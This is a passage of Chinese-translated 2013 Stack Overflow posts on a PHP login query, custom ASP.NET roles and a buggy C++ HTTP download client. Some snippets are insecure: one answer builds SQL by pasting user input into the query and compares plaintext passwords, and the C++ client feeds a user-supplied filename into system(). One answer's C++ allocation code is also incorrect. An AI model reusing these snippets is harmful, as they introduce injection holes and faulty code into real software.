$sql = sprintf("SELECT * FROM login WHERE username = '%s' and password = '%s'", mysql_real_escape_string($username), mysql_real_escape_string($password)); 
```

至于实际问题，可能就像其他人所说的那样（数据库连接），为了安全起见，请说：（如果可能的话，对于多个条目）

```
if (mysql_num_rows($result)) 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-01T07:12:01.557

你可以尝试使用：

```
SELECT * FROM login WHERE username = '$username' and password = '$password' LIMIT 1 
```

`LIMIT 1`在最后。

也许您有多行匹配相同的用户名和密码。

# asp.net - 以不同的方式分配角色

> ID：15738994
> 
> 赞同：0
> 
> 时间：2013-04-01T06:54:21.367
> 
> 标签：asp.net

最近我想以不同的方式将角色应用于用户，而不使用角色管理器等。比如创建一个名为“ROLES”的列......并通过在登录时检查此列来重定向用户。我知道你们中的很多人在想什么我会做吗。我也这么想经理而不是这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:53:59.373

使用那个[链接](http://www.4guysfromrolla.com/articles/050306-1.aspx)，我想它会帮助你..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T12:26:32.330

好吧，Rohan，你的方式没有任何问题。我已经使用这种类型的技术 2 年了，因为我懒得通过角色管理器并在需要的地方覆盖它。

但是我现在觉得我一直在重新发明轮子。你怎么看是你的偏见。

和你的最后一个问题“为什么要避免这种技术，应该使用角色管理器而不是这个？” 答案是因为它是现成的和经过时间考验的。您编写的任何**新**代码都有可能存在错误的理论限制，因此假设您已经推出了自己的身份验证引擎 - 您必须对其进行测试。您是否必须付出额外的努力？

# c++ - 大文件上的 fwrite 字节损坏

> ID：15738999
> 
> 赞同：0
> 
> 时间：2013-04-01T06:54:53.957
> 
> 标签：c++, http

我正在开发一个关于客户端和服务器的 c++ 程序（最像练习课），使用 HTTP 协议，用户给客户端一个文件文件名和大小（字节），然后客户端创建 n 个线程，每个线程都要求到服务器的特定字节数，服务器参与命令，客户端接收数据并将所有数据放在一起。

我的程序适用于小文件（100kb - 200kb），但是当我尝试从服务器发送大文件（例如 Mb）时，所有字节都被接收但最终文件已损坏，每个线程都有自己的初始化和结束字节数并创建一个名为“file_n.txt”的文件，因此将所有字节放在一起时的字节顺序没有问题，最终损坏的文件具有与原始文件相同的字节数（所有字节都是收到，我也检查服务器日志关于线程要求的字节间隔）但它的 hexdump 是不同的（显然）。

你认为 fwrite 函数与这个问题有关吗？如果是的话，你会很酷，请给我指出正确的方向，我正在努力解决这个问题，这是我的 client.cpp 代码

```
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h> 
#include <iostream>
#include <string>
#include <sstream>

using namespace std;
const int MAX_HEADER_SIZE = 1000;
int threadsEnd = 0;

struct bytes
{
  int initByte;
    int endByte;
  int bufferSize;
  int id;
  char * port;
  char * ip;
  char * image;
};

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

void * request_bytes (void * parameters)
{
  struct bytes * p = (struct bytes *) parameters;

  int sockfd, portno, n;
  struct sockaddr_in serv_addr;
  struct hostent *server;

  int totalBuffer = MAX_HEADER_SIZE + p->bufferSize + 1;
  int totalBodyContent = p->bufferSize + 1;

  char buffer[totalBuffer];
  char bodyContent[totalBodyContent];

  portno = atoi(p->port);
  server = gethostbyname(p->ip);

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
  serv_addr.sin_port = htons(portno);

  if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");

  ostringstream init,end;
  init << p->initByte;
  end << p->endByte;

  string HttpRequestString = string("POST / HTTP/1.1\r\n") 
                           + string("Host: ") + p->ip + string("\n")
                           + string("Connection: Close\n")
                           + string("Content-Length: 4\n")
                           + string("Content-Type: txt\n\n")
                           + string("nombre=") + p->image + string("&inicio=") + init.str() + string("&fin=") + end.str() + string("\n");

  const char * HttpRequest = HttpRequestString.c_str(); 

  n = write(sockfd,(void *)HttpRequest, strlen(HttpRequest));

  if (n < 0) 
    error("ERROR writing to socket");

  bzero(buffer,(MAX_HEADER_SIZE + p->bufferSize));
  int headerEndDetermined = 0, bodyEnd = 0;

  int x = 1;
  int bodyInit = 1;
  int total_bytes = 0;

  n = read(sockfd,buffer,((MAX_HEADER_SIZE + p->bufferSize) - 1));

  if (n < 0) 
    error("ERROR reading from socket");

  for(; x < strlen(buffer); x++)
    if(buffer[x - 1] == '\n')
      if(buffer[x] == '\n')
      {
         headerEndDetermined = 1;
         bodyInit = x + 1;
         break;
      }

  for(x = 0; x < p->bufferSize ; x++)
  {
    bodyContent[x] = buffer[bodyInit];
    bodyInit++;
  }

  //Escritura de archivo
  char filename[32];
  snprintf(filename, sizeof(char) * 32, "file%i", p->id);

  FILE * pFile;
  pFile = fopen (filename,"wb");
  if(pFile != NULL)
  {
    fwrite (bodyContent,1,sizeof(bodyContent) - 1,pFile);
    fclose (pFile);
  }

  close(sockfd);
  threadsEnd++;

  return NULL;
}

int main (int argc, char *argv[])
{
  if (argc < 5) {
       fprintf(stderr,"uso %s hostname puerto image_name bytes\n", argv[0]);
       exit(0);
  }

  int globalByte = atoi(argv[4]);
  int threadRequest = 10;
  int requestBytes = (globalByte / threadRequest);
  int globalInitialByte = 1;
  int globalEndByte = requestBytes;
  int x = 0, i = 1;
  int totalBytesRequested = 0;

  pthread_t request[threadRequest];

  for(; x < threadRequest; x++){
    struct bytes request_args;

    request_args.initByte = globalInitialByte;
    request_args.endByte = globalEndByte;
    request_args.bufferSize = requestBytes;
    request_args.id = x + 1;

    globalInitialByte = globalEndByte + 1;
    globalEndByte = globalEndByte + requestBytes;

    if(x == (threadRequest - 1))
    {
      if((totalBytesRequested + requestBytes) < globalByte)
      {
        request_args.endByte = globalByte; 
        request_args.bufferSize = requestBytes + (globalByte - (totalBytesRequested + requestBytes));
      }    
    }
    request_args.ip = argv[1];
    request_args.port = argv[2];
    request_args.image = argv[3];

    pthread_create (&request[x], NULL, &request_bytes, &request_args);
    pthread_join (request[x], NULL); 

    totalBytesRequested += requestBytes;
  }

  /*do
  {
    cout<<"Threads completos: "<<threadsEnd<<endl;
  }while(threadsEnd < threadRequest);*/

  string createFileString = string("cat ");
  for(; i <= threadRequest; i++)
  {
    ostringstream filen;
    filen << i;
    createFileString = createFileString + string("file") + filen.str() + string(" ");
  }
  createFileString = createFileString + string("> new_") + argv[3];                  
  system(createFileString.c_str());

    return 0;
} 
```

抱歉我的语法不好：p。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T07:25:30.307

你有很多错误。

1.  HTTP 协议指定行必须以“\r\n”结尾，而不是“\n”。

2.  您指定了四个字节的内容长度，但您的内容比这更长。

3.  不要使用`sizeof`或者`strlen`当您的代码已经知道事物的大小时。它会让你陷入困境。

4.  你只调用`read`一次。您需要继续拨打电话`read`，直到收到所有数据。

5.  您指定了 HTTP 1.1 合规性，但您的代码实际上并不符合 HTTP 1.1 规范。例如，如果您收到带有分块编码的数据，您的代码会严重中断。HTTP 1.1 客户端*需要*支持分块编码。“*所有 HTTP/1.1 应用程序必须能够接收和解码`chunked`传输编码*[.]”—— [RFC2616 3.6.1](http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:26:55.867

我认为您不能在运行时声明字符串大小，您需要更改

```
char buffer[totalBuffer];
char bodyContent[totalBodyContent]; 
```

到

```
char buffer = new char[totalBuffer];
char bodyContent = new char[totalBodyContent]; 
```

并在最后删除缓冲区

```
delete [] buffer;
delete [] bodyContent; 
```

或者，您可以使用`malloc()`and`free()`来分配和释放缓冲区。